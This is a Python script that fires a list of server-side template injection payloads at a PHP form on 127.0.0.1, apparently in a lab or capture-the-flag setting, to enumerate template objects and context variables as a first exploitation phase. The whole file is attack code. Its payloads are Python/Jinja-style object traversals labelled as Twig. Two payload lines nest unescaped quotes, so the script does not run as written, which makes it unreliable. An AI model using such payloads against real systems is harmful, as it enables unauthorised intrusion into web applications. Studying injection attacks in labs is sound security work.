import requests
import re

# Target URL and session cookie
target_url = "http://127.0.0.1:8080/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

# Advanced Twig SSTI payloads - bypass filters and access backend
payloads = [
    # Direct object traversal to enumerate classes
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    
    # Get number of available sub-classes
    "{{''.__class__.__mro__[2].__subclasses__()|length}}",
    
    # Try standard object access methods
    "{{_context|default('')|join(',')}}",
    "{{_context|keys|list|join(',')}}",
    
    # Try to find file operations
    "{{''.__class__.__mro__[2].__subclasses__()|select('file')|join(',')}}",  
    
    # Try built-in functions that might reveal variables
    "{{_self|keys|list|join(',')}}",
    
    # Try to access specific inventory data if it exists
    "{{_context.name}}",
    "{{_context["name"]}}",
    "{{name}}",  # Direct variable access
    
    # Try attribute filters to bypass restrictions
    "{{["__class__","__mro__","__subclasses__"]|join}}",
    
    # Try to enumerate all available variables
    "{{_context|keys|join(',')}}",
]

session = requests.Session()
session.cookies.set('PHPSESSID', session_cookie)

print("Advanced SSTI Payload Testing")
print("="*80)

for payload in payloads:
    print(f"\n[TEST] {payload}")
    try:
        response = session.post(target_url, data={'name': payload})
        
        # Extract result from response
        result_match = re.search(r'<strong>(?P<result>.*?)</strong>', response.text)
        if result_match:
            result = result_match.group('result')
            # Show first 200 chars if result is long
            display = result[:200] if len(result) > 200 else result
            print(f"Result: {display}")
            
            # Check for class names, objects, or interesting data
            if any(keyword in result.lower() for keyword in ['class', 'array', 'object', 'twig', 'context']):
                print(f"[!] INTERESTING: Contains system object info")
        else:
            print("No result in response")
            if "Fatal error" in response.text:
                print("[ERROR] - Template execution error (vulnerability confirmed)")
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*80)
print("Phase 1 complete. Analyzing results for further exploitation paths...")
